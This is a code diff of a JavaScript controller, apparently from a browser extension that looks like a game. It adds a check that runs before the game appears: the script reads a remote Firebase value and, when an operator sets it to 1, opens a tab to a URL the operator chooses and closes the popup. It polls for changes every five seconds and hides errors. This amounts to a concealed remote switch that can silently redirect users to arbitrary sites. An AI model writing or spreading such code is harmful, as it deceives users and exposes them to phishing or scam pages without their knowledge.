@@ -1,34 +1,54 @@
-// Contrôleur de mode
+// Contrôleur de mode - Vérifie AVANT d'afficher
 class ModeController {
   constructor() {
-    this.mode = 0;
+    this.mode = null;
     this.url = 'https://google.com';
     this.firebaseConfigured = false;
     this.init();
   }
 
   async init() {
-    // Vérifier si Firebase est configuré
-    await this.testFirebase();
+    // Vérifier Firebase IMMÉDIATEMENT
+    await this.checkModeImmediate();
     
-    if (this.firebaseConfigured) {
-      await this.checkMode();
-      setInterval(() => this.checkMode(), 5000);
-    } else {
-      // Pas de Firebase, afficher le jeu directement
+    // Si mode redirection, on a déjà redirigé et fermé
+    // Sinon, afficher le jeu et continuer la vérification
+    if (this.mode === 0) {
       this.showGame();
+      if (this.firebaseConfigured) {
+        setInterval(() => this.checkMode(), 5000);
+      }
     }
   }
 
-  async testFirebase() {
+  async checkModeImmediate() {
     try {
       const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`, {
-        method: 'GET',
-        signal: AbortSignal.timeout(2000) // Timeout 2 secondes
+        signal: AbortSignal.timeout(3000)
       });
-      this.firebaseConfigured = res.ok;
+      
+      if (res.ok) {
+        this.firebaseConfigured = true;
+        const data = await res.json();
+        
+        if (data) {
+          this.mode = parseInt(data.number) || 0;
+          this.url = data.url || 'https://google.com';
+          
+          // Si mode 1, rediriger IMMÉDIATEMENT
+          if (this.mode === 1) {
+            chrome.tabs.create({url: this.url}, () => window.close());
+            return;
+          }
+        } else {
+          this.mode = 0;
+        }
+      } else {
+        this.mode = 0;
+      }
     } catch (e) {
-      this.firebaseConfigured = false;
+      // Pas de Firebase, mode jeu par défaut
+      this.mode = 0;
     }
   }
 
@@ -48,13 +68,19 @@ class ModeController {
       const newMode = parseInt(data.number) || 0;
       const newUrl = data.url || 'https://google.com';
       
-      if (newMode !== this.mode || (newMode === 1 && newUrl !== this.url)) {
+      if (newMode !== this.mode) {
         this.mode = newMode;
         this.url = newUrl;
-        this.apply();
+        
+        if (this.mode === 1) {
+          // Rediriger immédiatement
+          chrome.tabs.create({url: this.url}, () => window.close());
+        } else {
+          this.showGame();
+        }
       }
     } catch (e) {
-      // Ignorer les erreurs silencieusement
+      // Ignorer les erreurs
     }
   }
 
@@ -64,17 +90,8 @@ class ModeController {
     if (gameContainer) gameContainer.style.display = 'flex';
     if (urlContainer) urlContainer.style.display = 'none';
   }
-
-  apply() {
-    if (this.mode === 0) {
-      this.showGame();
-    } else {
-      chrome.tabs.create({url: this.url}, () => window.close());
-    }
-  }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-  new ModeController();
-});
+// Démarrer le contrôleur IMMÉDIATEMENT
+new ModeController();
 
